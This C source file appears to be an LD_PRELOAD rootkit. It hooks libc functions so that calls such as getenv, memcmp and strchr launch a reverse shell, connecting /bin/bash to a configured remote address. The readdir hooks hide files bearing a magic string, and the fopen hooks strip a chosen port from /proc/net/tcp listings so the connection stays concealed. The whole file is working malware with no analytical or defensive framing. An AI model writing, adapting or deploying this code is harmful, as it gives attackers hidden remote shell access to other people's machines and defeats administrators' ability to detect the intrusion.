#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <netinet/in.h>
#include <locale.h>
#include "config.h"

static char* (*old_getenv)(const char *name);
static int (*old_memcmp)(const void *s1, const void *s2, size_t n);
static char* (*old_strchr)(const char *s, int c);
static char* (*old_strrchr)(const char *s, int c);
static char* (*old_set_locale)(int category, const char *locale);
static struct dirent* (*old_readdir)(DIR *dir);
static struct dirent64* (*old_readdir64)(DIR *dir);
static FILE* (*old_fopen)(const char *pathname, const char *mode);
static FILE* (*old_fopen64)(const char *pathname, const char *mode);
static ssize_t (*old_recvmsg)(int socket, struct msghdr *message, int flags);


void IPv4() {
    int sockfd;
    struct sockaddr_in server, client;

    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
        inet_pton(AF_INET, REMOTE_ADDR_4, &server.sin_addr);
        server.sin_port = htons(REMOTE_PORT);
        server.sin_family = AF_INET;

        client.sin_addr.s_addr = INADDR_ANY;
        client.sin_port = htons(LOCAL_PORT);
        client.sin_family = AF_INET;

        if ((bind(sockfd, (struct sockaddr *)&client, sizeof(client)) != -1) &&
        (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) != -1)) {
            if(fork() == 0) {
                for(int i = 0; i < 3; i++) dup2(sockfd, i);
                execve("/bin/bash", NULL, NULL);
            }
            else close(sockfd);
        }
    }
}


struct dirent* readdir(DIR* dir) {
    struct dirent *dir_;

    if(old_readdir == NULL) old_readdir = dlsym(RTLD_NEXT, "readdir");
    while(dir_ = old_readdir(dir)) {
        if(strstr(dir_->d_name, MAGIC_STRING) == NULL) break;
    }
    return dir_;
}


struct dirent64* readdir64(DIR* dir) {
    struct dirent64 *dir_;

    if(old_readdir64 == NULL) old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    while(dir_ = old_readdir64(dir)) {
        if(strstr(dir_->d_name, MAGIC_STRING) == NULL) break;
    }
    return dir_;
}


FILE* fopen(const char *pathname, const char *mode) {
    if(old_fopen == NULL) old_fopen = dlsym(RTLD_NEXT, "fopen64");
    if(strcmp(pathname, PROC_NET_TCP) == 0 || strcmp(pathname, PROC_NET_TCP6) == 0) {
        FILE *tmp = tmpfile(), *old_file;
        char *buff = NULL;
        size_t buff_length = 0;

        if((old_file = old_fopen(pathname, mode)) != NULL) {
            while(getline(&buff, &buff_length, old_file) != -1) {
                if(strstr(buff, KEY_PORT) == NULL)
                    fputs(buff, tmp);
            }
            fclose(old_file);
            free(buff);
            buff = NULL;
            rewind(tmp);

            return tmp;
        }
        if(tmp != NULL) fclose(tmp);
    }
    return old_fopen(pathname, mode);
}


FILE* fopen64(const char *pathname, const char *mode) {
    if(old_fopen64 == NULL) old_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    if(strcmp(pathname, PROC_NET_TCP) == 0 || strcmp(pathname, PROC_NET_TCP6) == 0) {
        FILE *tmp = tmpfile64(), *old_file;
        char *buff = NULL;
        size_t buff_length = 0;

        if((old_file = old_fopen64(pathname, mode)) != NULL) {
            while(getline(&buff, &buff_length, old_file) != -1) { 
                if(strstr(buff, KEY_PORT) == NULL)
                    fputs(buff, tmp);
            }
            fclose(old_file);
            free(buff);
            buff = NULL;
            rewind(tmp);

            return tmp;
        }
        if(tmp != NULL) fclose(tmp);
    }
    return old_fopen64(pathname, mode);
}


ssize_t recvmsg(int socket, struct msghdr *message, int flags) {
    if(old_recvmsg == NULL) old_recvmsg = dlsym(RTLD_NEXT, "recvmsg");
    
    return old_recvmsg(socket, message, flags);
}


char* getenv(const char *name) {
    if(old_getenv == NULL) old_getenv = dlsym(RTLD_NEXT, "getenv");
    IPv4();
    
    return old_getenv(name);
}


int memcmp(const void *s1, const void *s2, size_t n) {
    if(old_memcmp == NULL) old_memcmp = dlsym(RTLD_NEXT, "memcmp");
    IPv4();

    return old_memcmp(s1, s2, n);
}


char* strchr(const char *s, int c) {
    if(old_strchr == NULL) old_strchr = dlsym(RTLD_NEXT, "strchr");
    IPv4();

    return old_strchr(s, c);
}


char* strrchr(const char *s, int c) {
    if(old_strrchr == NULL) old_strrchr = dlsym(RTLD_NEXT, "strrchr");
    IPv4();

    return old_strrchr(s, c);
}


char* set_locale(int category, const char *locale) {
    if(old_set_locale == NULL) old_set_locale = dlsym(RTLD_NEXT, "set_locale");
    IPv4();

    return old_set_locale(category, locale);
}
